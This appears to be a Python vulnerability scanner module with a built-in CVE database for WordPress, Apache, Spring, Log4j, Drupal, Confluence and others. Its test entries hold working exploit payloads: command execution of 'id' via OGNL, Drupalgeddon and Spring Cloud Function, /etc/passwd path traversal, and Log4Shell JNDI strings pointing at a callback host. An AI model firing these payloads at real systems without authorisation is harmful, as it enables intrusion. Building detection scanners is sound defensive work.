import re
import json
import asyncio
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from pathlib import Path
from datetime import datetime
import aiofiles


@dataclass
class CVE:
    id: str
    product: str
    affected_versions: str
    fixed_version: Optional[str]
    cvss: float
    description: str
    cwe: Optional[str]
    test: Optional[dict]
    references: List[str] = field(default_factory=list)
    exploit_available: bool = False
    
    def to_dict(self) -> dict:
        return {
            "id": self.id,
            "product": self.product,
            "affected_versions": self.affected_versions,
            "fixed_version": self.fixed_version,
            "cvss": self.cvss,
            "description": self.description,
            "cwe": self.cwe,
            "test": self.test,
            "references": self.references,
            "exploit_available": self.exploit_available,
        }
    
    @classmethod
    def from_dict(cls, product: str, data: dict) -> "CVE":
        return cls(
            id=data.get("id", ""),
            product=product,
            affected_versions=data.get("affected_versions", ""),
            fixed_version=data.get("fixed_version"),
            cvss=data.get("cvss", 0.0),
            description=data.get("description", ""),
            cwe=data.get("cwe"),
            test=data.get("test"),
            references=data.get("references", []),
            exploit_available=data.get("exploit_available", False),
        )


@dataclass
class CVETestResult:
    cve_id: str
    vulnerable: bool
    confidence: str
    evidence: str
    remediation: str
    response: Optional[dict] = None
    
    def to_dict(self) -> dict:
        return {
            "cve_id": self.cve_id,
            "vulnerable": self.vulnerable,
            "confidence": self.confidence,
            "evidence": self.evidence,
            "remediation": self.remediation,
        }


@dataclass
class ProductInfo:
    name: str
    display_name: str
    fingerprints: List[str]
    cves: List[CVE]
    
    @classmethod
    def from_dict(cls, key: str, data: dict) -> "ProductInfo":
        cves = [CVE.from_dict(key, cve_data) for cve_data in data.get("cves", [])]
        return cls(
            name=key,
            display_name=data.get("name", key),
            fingerprints=data.get("fingerprints", []),
            cves=cves,
        )


DEFAULT_CVE_DATABASE = {
    "wordpress": {
        "name": "WordPress",
        "fingerprints": ["wp-includes", "wp-content", "wp-login.php", "/wp-json/"],
        "cves": [
            {
                "id": "CVE-2023-2982",
                "affected_versions": "<6.2.1",
                "fixed_version": "6.2.1",
                "cvss": 7.5,
                "description": "WordPress before 6.2.1 allows unauthenticated users to access metadata",
                "cwe": "CWE-200",
                "test": {
                    "type": "request",
                    "method": "GET",
                    "path": "/wp-json/wp/v2/users?context=edit",
                    "detect": {"status": 200, "body_contains": "\"email\":"}
                },
                "references": ["https://wpscan.com/vulnerability/"],
            },
            {
                "id": "CVE-2022-21661",
                "affected_versions": "<5.8.3",
                "fixed_version": "5.8.3",
                "cvss": 8.0,
                "description": "SQL injection via WP_Query",
                "cwe": "CWE-89",
                "test": {
                    "type": "request",
                    "method": "GET",
                    "path": "/wp-json/wp/v2/posts?tax_query[0][include_children]=1%27",
                    "detect": {"body_contains": "error"}
                },
            },
        ],
    },
    "apache": {
        "name": "Apache HTTP Server",
        "fingerprints": ["Apache/", "Server: Apache"],
        "cves": [
            {
                "id": "CVE-2021-41773",
                "affected_versions": "2.4.49",
                "fixed_version": "2.4.50",
                "cvss": 9.8,
                "description": "Path traversal and RCE in Apache 2.4.49",
                "cwe": "CWE-22",
                "test": {
                    "type": "request",
                    "method": "GET",
                    "path": "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                    "detect": {"body_contains": "root:"}
                },
                "exploit_available": True,
            },
            {
                "id": "CVE-2021-42013",
                "affected_versions": "2.4.49-2.4.50",
                "fixed_version": "2.4.51",
                "cvss": 9.8,
                "description": "Path traversal bypass in Apache 2.4.49-2.4.50",
                "cwe": "CWE-22",
                "test": {
                    "type": "request",
                    "method": "GET",
                    "path": "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
                    "detect": {"body_contains": "root:"}
                },
            },
        ],
    },
    "nginx": {
        "name": "Nginx",
        "fingerprints": ["nginx/", "Server: nginx"],
        "cves": [
            {
                "id": "CVE-2021-23017",
                "affected_versions": "<1.21.0",
                "fixed_version": "1.21.0",
                "cvss": 7.7,
                "description": "DNS resolver vulnerability",
                "cwe": "CWE-193",
                "test": None,
            },
        ],
    },
    "spring": {
        "name": "Spring Framework",
        "fingerprints": ["Whitelabel Error Page", "org.springframework", "spring-boot"],
        "cves": [
            {
                "id": "CVE-2022-22965",
                "affected_versions": "<5.3.18",
                "fixed_version": "5.3.18",
                "cvss": 9.8,
                "description": "Spring4Shell - RCE via data binding",
                "cwe": "CWE-94",
                "test": {
                    "type": "request",
                    "method": "POST",
                    "path": "/",
                    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                    "data": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=test",
                    "detect": {"status": [200, 400, 500]}
                },
                "exploit_available": True,
            },
            {
                "id": "CVE-2022-22963",
                "affected_versions": "<3.1.7",
                "fixed_version": "3.1.7",
                "cvss": 9.8,
                "description": "Spring Cloud Function RCE",
                "cwe": "CWE-94",
                "test": {
                    "type": "request",
                    "method": "POST",
                    "path": "/functionRouter",
                    "headers": {"spring.cloud.function.routing-expression": "T(java.lang.Runtime).getRuntime().exec('id')"},
                    "detect": {"status": [500]}
                },
            },
        ],
    },
    "log4j": {
        "name": "Log4j",
        "fingerprints": ["log4j", "Log4j"],
        "cves": [
            {
                "id": "CVE-2021-44228",
                "affected_versions": "<2.15.0",
                "fixed_version": "2.17.0",
                "cvss": 10.0,
                "description": "Log4Shell - RCE via JNDI lookup",
                "cwe": "CWE-502",
                "test": {
                    "type": "oob_injection",
                    "payloads": [
                        "${jndi:ldap://${OOB_HOST}/a}",
                        "${${lower:j}${lower:n}${lower:d}i:${lower:l}${lower:d}a${lower:p}://${OOB_HOST}/a}",
                    ],
                    "inject_locations": ["headers", "params", "body"],
                },
                "exploit_available": True,
            },
        ],
    },
    "drupal": {
        "name": "Drupal",
        "fingerprints": ["Drupal", "drupal.js", "/sites/default/"],
        "cves": [
            {
                "id": "CVE-2018-7600",
                "affected_versions": "<7.58",
                "fixed_version": "7.58",
                "cvss": 9.8,
                "description": "Drupalgeddon 2 - RCE",
                "cwe": "CWE-94",
                "test": {
                    "type": "request",
                    "method": "POST",
                    "path": "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
                    "data": "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id",
                    "detect": {"body_contains": "uid="}
                },
                "exploit_available": True,
            },
        ],
    },
    "jira": {
        "name": "Atlassian Jira",
        "fingerprints": ["Jira", "atlassian-token", "jira.webresources"],
        "cves": [
            {
                "id": "CVE-2019-11581",
                "affected_versions": "<8.2.4",
                "fixed_version": "8.2.4",
                "cvss": 9.8,
                "description": "Template injection in Contact Administrators",
                "cwe": "CWE-94",
                "test": {
                    "type": "request",
                    "method": "GET",
                    "path": "/secure/ContactAdministrators!default.jspa",
                    "detect": {"status": 200}
                },
            },
        ],
    },
    "confluence": {
        "name": "Atlassian Confluence",
        "fingerprints": ["Confluence", "confluence", "Atlassian Confluence"],
        "cves": [
            {
                "id": "CVE-2022-26134",
                "affected_versions": "<7.18.1",
                "fixed_version": "7.18.1",
                "cvss": 9.8,
                "description": "OGNL injection - RCE",
                "cwe": "CWE-917",
                "test": {
                    "type": "request",
                    "method": "GET",
                    "path": "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/",
                    "detect": {"header_contains": {"X-Cmd-Response": "uid="}}
                },
                "exploit_available": True,
            },
        ],
    },
    "phpmyadmin": {
        "name": "phpMyAdmin",
        "fingerprints": ["phpMyAdmin", "pma", "phpmyadmin"],
        "cves": [
            {
                "id": "CVE-2018-12613",
                "affected_versions": "<4.8.2",
                "fixed_version": "4.8.2",
                "cvss": 8.8,
                "description": "LFI via second-order attack",
                "cwe": "CWE-98",
                "test": {
                    "type": "request",
                    "method": "GET",
                    "path": "/index.php?target=db_sql.php%253f/../../../../../../etc/passwd",
                    "detect": {"body_contains": "root:"}
                },
            },
        ],
    },
    "gitlab": {
        "name": "GitLab",
        "fingerprints": ["GitLab", "gitlab-"],
        "cves": [
            {
                "id": "CVE-2021-22205",
                "affected_versions": "<13.10.3",
                "fixed_version": "13.10.3",
                "cvss": 10.0,
                "description": "RCE via image upload (ExifTool)",
                "cwe": "CWE-94",
                "test": None,
                "exploit_available": True,
            },
        ],
    },
}


class CVEDatabase:
    def __init__(self, db_path: str = None):
        self.db_path = db_path
        self.products: Dict[str, ProductInfo] = {}
        self._load_default()
    
    def _load_default(self):
        for key, data in DEFAULT_CVE_DATABASE.items():
            self.products[key] = ProductInfo.from_dict(key, data)
    
    async def load(self, path: str = None):
        load_path = path or self.db_path
        if not load_path:
            return
        
        try:
            async with aiofiles.open(load_path, 'r') as f:
                data = json.loads(await f.read())
            
            for key, product_data in data.get("products", {}).items():
                self.products[key] = ProductInfo.from_dict(key, product_data)
        except Exception:
            pass
    
    async def save(self, path: str = None):
        save_path = path or self.db_path
        if not save_path:
            return
        
        data = {
            "products": {
                key: {
                    "name": product.display_name,
                    "fingerprints": product.fingerprints,
                    "cves": [cve.to_dict() for cve in product.cves],
                }
                for key, product in self.products.items()
            },
            "updated": datetime.now().isoformat(),
        }
        
        async with aiofiles.open(save_path, 'w') as f:
            await f.write(json.dumps(data, indent=2))
    
    def identify_product(self, fingerprints: Dict[str, Any]) -> List[Tuple[str, str]]:
        identified = []
        
        for key, product in self.products.items():
            for fp in product.fingerprints:
                fp_lower = fp.lower()
                
                for fp_key, fp_value in fingerprints.items():
                    if isinstance(fp_value, str) and fp_lower in fp_value.lower():
                        version = self._extract_version(fp_value, key)
                        identified.append((key, version))
                        break
        
        return list(set(identified))
    
    def get_cves_for_product(self, product: str, version: str = None) -> List[CVE]:
        if product not in self.products:
            return []
        
        product_info = self.products[product]
        
        if not version:
            return product_info.cves
        
        affected_cves = []
        for cve in product_info.cves:
            if self._is_version_affected(version, cve.affected_versions):
                affected_cves.append(cve)
        
        return sorted(affected_cves, key=lambda c: c.cvss, reverse=True)
    
    def _is_version_affected(self, version: str, affected_spec: str) -> bool:
        if not version or not affected_spec:
            return True
        
        version = version.strip()
        affected_spec = affected_spec.strip()
        
        if affected_spec.startswith("<"):
            compare_version = affected_spec[1:].strip()
            return self._compare_versions(version, compare_version) < 0
        
        if affected_spec.startswith("<="):
            compare_version = affected_spec[2:].strip()
            return self._compare_versions(version, compare_version) <= 0
        
        if affected_spec.startswith(">"):
            compare_version = affected_spec[1:].strip()
            return self._compare_versions(version, compare_version) > 0
        
        if "-" in affected_spec:
            parts = affected_spec.split("-")
            if len(parts) == 2:
                min_ver, max_ver = parts
                return (self._compare_versions(version, min_ver.strip()) >= 0 and
                        self._compare_versions(version, max_ver.strip()) <= 0)
        
        return affected_spec in version or version in affected_spec
    
    def _compare_versions(self, v1: str, v2: str) -> int:
        def normalize(v):
            parts = re.split(r'[.\-_]', v)
            result = []
            for p in parts:
                match = re.match(r'^(\d+)', p)
                if match:
                    result.append(int(match.group(1)))
            return result
        
        p1 = normalize(v1)
        p2 = normalize(v2)
        
        for i in range(max(len(p1), len(p2))):
            n1 = p1[i] if i < len(p1) else 0
            n2 = p2[i] if i < len(p2) else 0
            if n1 < n2:
                return -1
            if n1 > n2:
                return 1
        
        return 0
    
    def _extract_version(self, text: str, product: str) -> Optional[str]:
        patterns = [
            rf'{product}[/\s-]*([\d.]+)',
            r'version[:\s]*([\d.]+)',
            r'v([\d.]+)',
            r'([\d]+\.[\d]+\.[\d]+)',
            r'([\d]+\.[\d]+)',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                return match.group(1)
        
        return None
    
    async def test_cve(self, http_client, base_url: str, cve: CVE, oob_host: str = None) -> CVETestResult:
        if not cve.test:
            return CVETestResult(
                cve_id=cve.id,
                vulnerable=False,
                confidence="LOW",
                evidence="No test available for this CVE",
                remediation=f"Upgrade to {cve.fixed_version}" if cve.fixed_version else "Apply vendor patches",
            )
        
        test = cve.test
        test_type = test.get("type", "request")
        
        if test_type == "request":
            return await self._test_request(http_client, base_url, cve, test)
        elif test_type == "oob_injection":
            return await self._test_oob(http_client, base_url, cve, test, oob_host)
        
        return CVETestResult(
            cve_id=cve.id,
            vulnerable=False,
            confidence="LOW",
            evidence=f"Unknown test type: {test_type}",
            remediation=f"Upgrade to {cve.fixed_version}" if cve.fixed_version else "Apply vendor patches",
        )
    
    async def _test_request(self, http_client, base_url: str, cve: CVE, test: dict) -> CVETestResult:
        method = test.get("method", "GET")
        path = test.get("path", "/")
        headers = test.get("headers", {})
        data = test.get("data")
        detect = test.get("detect", {})
        
        from urllib.parse import urljoin
        url = urljoin(base_url, path)
        
        try:
            if method == "GET":
                response = await http_client.get(url, headers=headers)
            elif method == "POST":
                if isinstance(data, str):
                    response = await http_client.post(url, headers=headers, data=data)
                else:
                    response = await http_client.post(url, headers=headers, json=data)
            else:
                response = await http_client.request(method, url, headers=headers, data=data)
            
            vulnerable = self._check_detection(response, detect)
            
            evidence = []
            if vulnerable:
                if detect.get("body_contains"):
                    evidence.append(f"Response contains: {detect['body_contains']}")
                if detect.get("status"):
                    evidence.append(f"Status: {response.get('status')}")
                if detect.get("header_contains"):
                    evidence.append(f"Header match found")
            
            return CVETestResult(
                cve_id=cve.id,
                vulnerable=vulnerable,
                confidence="HIGH" if vulnerable else "LOW",
                evidence="; ".join(evidence) if evidence else "No indicators found",
                remediation=f"Upgrade to {cve.fixed_version}" if cve.fixed_version else "Apply vendor patches",
                response=response if vulnerable else None,
            )
        
        except Exception as e:
            return CVETestResult(
                cve_id=cve.id,
                vulnerable=False,
                confidence="LOW",
                evidence=f"Test failed: {str(e)}",
                remediation=f"Upgrade to {cve.fixed_version}" if cve.fixed_version else "Apply vendor patches",
            )
    
    async def _test_oob(self, http_client, base_url: str, cve: CVE, test: dict, oob_host: str) -> CVETestResult:
        if not oob_host:
            return CVETestResult(
                cve_id=cve.id,
                vulnerable=False,
                confidence="LOW",
                evidence="OOB testing requires --oob-host parameter",
                remediation=f"Upgrade to {cve.fixed_version}" if cve.fixed_version else "Apply vendor patches",
            )
        
        payloads = test.get("payloads", [])
        inject_locations = test.get("inject_locations", ["headers"])
        
        for payload in payloads:
            payload = payload.replace("${OOB_HOST}", oob_host)
            
            if "headers" in inject_locations:
                headers = {
                    "X-Forwarded-For": payload,
                    "User-Agent": payload,
                    "Referer": payload,
                }
                try:
                    await http_client.get(base_url, headers=headers)
                except:
                    pass
        
        return CVETestResult(
            cve_id=cve.id,
            vulnerable=False,
            confidence="LOW",
            evidence="OOB payloads sent - check your callback server for interactions",
            remediation=f"Upgrade to {cve.fixed_version}" if cve.fixed_version else "Apply vendor patches",
        )
    
    def _check_detection(self, response: dict, detect: dict) -> bool:
        if not detect:
            return False
        
        status = response.get("status", 0)
        text = response.get("text", "")
        headers = response.get("headers", {})
        
        if "status" in detect:
            expected = detect["status"]
            if isinstance(expected, list):
                if status not in expected:
                    return False
            elif status != expected:
                return False
        
        if "body_contains" in detect:
            if detect["body_contains"] not in text:
                return False
        
        if "body_not_contains" in detect:
            if detect["body_not_contains"] in text:
                return False
        
        if "header_contains" in detect:
            for header, value in detect["header_contains"].items():
                header_value = headers.get(header, "")
                if value not in header_value:
                    return False
        
        return True
    
    def get_all_products(self) -> List[str]:
        return list(self.products.keys())
    
    def get_cve_count(self) -> int:
        return sum(len(p.cves) for p in self.products.values())
    
    def search_cves(self, query: str) -> List[CVE]:
        results = []
        query_lower = query.lower()
        
        for product in self.products.values():
            for cve in product.cves:
                if (query_lower in cve.id.lower() or
                    query_lower in cve.description.lower() or
                    query_lower in product.name.lower()):
                    results.append(cve)
        
        return results


def create_cve_db(db_path: str = None) -> CVEDatabase:
    return CVEDatabase(db_path)
